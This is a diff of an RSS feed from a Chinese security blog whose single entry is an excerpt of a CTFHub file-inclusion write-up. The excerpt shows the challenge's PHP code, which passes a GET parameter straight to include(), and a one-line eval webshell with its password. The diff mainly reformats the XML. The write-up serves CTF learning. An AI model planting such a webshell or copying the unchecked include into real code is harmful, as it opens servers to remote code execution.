@@ -1,40 +1,25 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
-  <channel>
-    <title>蚁剑 on 东阳的安全笔记</title>
-    <link>https://Samantha09.github.io/san-blog/tags/%E8%9A%81%E5%89%91/</link>
-    <description>Recent content in 蚁剑 on 东阳的安全笔记</description>
-    <generator>Hugo</generator>
-    <language>zh-cn</language>
-    <lastBuildDate>Fri, 05 Jun 2026 23:10:00 +0800</lastBuildDate>
-    <atom:link href="https://Samantha09.github.io/san-blog/tags/%E8%9A%81%E5%89%91/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>CTFHub 文件包含实战：利用一句话木马 getshell</title>
-      <link>https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/</link>
-      <pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/</guid>
-      <description>&lt;h2 id=&#34;一题目信息&#34;&gt;一、题目信息&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>蚁剑 on 东阳的个人站点</title><link>https://Samantha09.github.io/san-blog/tags/%E8%9A%81%E5%89%91/</link><description>Recent content in 蚁剑 on 东阳的个人站点</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Fri, 05 Jun 2026 23:10:00 +0800</lastBuildDate><atom:link href="https://Samantha09.github.io/san-blog/tags/%E8%9A%81%E5%89%91/index.xml" rel="self" type="application/rss+xml"/><item><title>CTFHub 文件包含实战：利用一句话木马 getshell</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</link><pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / RCE / 文件包含&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：PHP &lt;code&gt;include&lt;/code&gt; 函数、一句话木马、WebShell 连接&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;题目链接：&lt;a href=&#34;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&#34;&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;题目链接：&lt;a href="https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html"&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;二源码分析&#34;&gt;二、源码分析&lt;/h2&gt;
+&lt;h2 id="二源码分析"&gt;二、源码分析&lt;/h2&gt;
 &lt;p&gt;进入题目后，直接给出了 PHP 源码：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);  &lt;span style=&#34;color:#75715e&#34;&gt;// 关闭报错显示
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) {                    &lt;span style=&#34;color:#75715e&#34;&gt;// 接收 file 参数
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {  &lt;span style=&#34;color:#75715e&#34;&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;;                           &lt;span style=&#34;color:#75715e&#34;&gt;// 输出 hack，阻止访问
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]);                &lt;span style=&#34;color:#75715e&#34;&gt;// 否则包含指定文件
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逻辑梳理&#34;&gt;逻辑梳理&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;); &lt;span style="color:#75715e"&gt;// 关闭报错显示
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) { &lt;span style="color:#75715e"&gt;// 接收 file 参数
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style="color:#e6db74"&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;) { &lt;span style="color:#75715e"&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;; &lt;span style="color:#75715e"&gt;// 输出 hack，阻止访问
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]); &lt;span style="color:#75715e"&gt;// 否则包含指定文件
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="逻辑梳理"&gt;逻辑梳理&lt;/h3&gt;
 &lt;table&gt;
 	&lt;thead&gt;
 			&lt;tr&gt;
@@ -55,19 +40,16 @@
 &lt;/table&gt;
 &lt;p&gt;&lt;strong&gt;核心考点&lt;/strong&gt;：&lt;code&gt;include()&lt;/code&gt; 函数的特性——&lt;strong&gt;不检查后缀，直接执行文件中的 PHP 代码&lt;/strong&gt;。&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;三发现突破口&#34;&gt;三、发现突破口&lt;/h2&gt;
+&lt;h2 id="三发现突破口"&gt;三、发现突破口&lt;/h2&gt;
 &lt;p&gt;题目下方有一个提示链接，访问后得到 &lt;code&gt;shell.txt&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内容是一句话木马：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;连接密码&lt;/strong&gt;：&lt;code&gt;ctfhub&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST[&#39;ctfhub&#39;]&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST['ctfhub']&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;四解题思路&#34;&gt;四、解题思路&lt;/h2&gt;
-&lt;h3 id=&#34;41-include-函数的关键特性&#34;&gt;4.1 include 函数的关键特性&lt;/h3&gt;
-&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description>
-    </item>
-  </channel>
-</rss>
+&lt;h2 id="四解题思路"&gt;四、解题思路&lt;/h2&gt;
+&lt;h3 id="41-include-函数的关键特性"&gt;4.1 include 函数的关键特性&lt;/h3&gt;
+&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description></item></channel></rss>
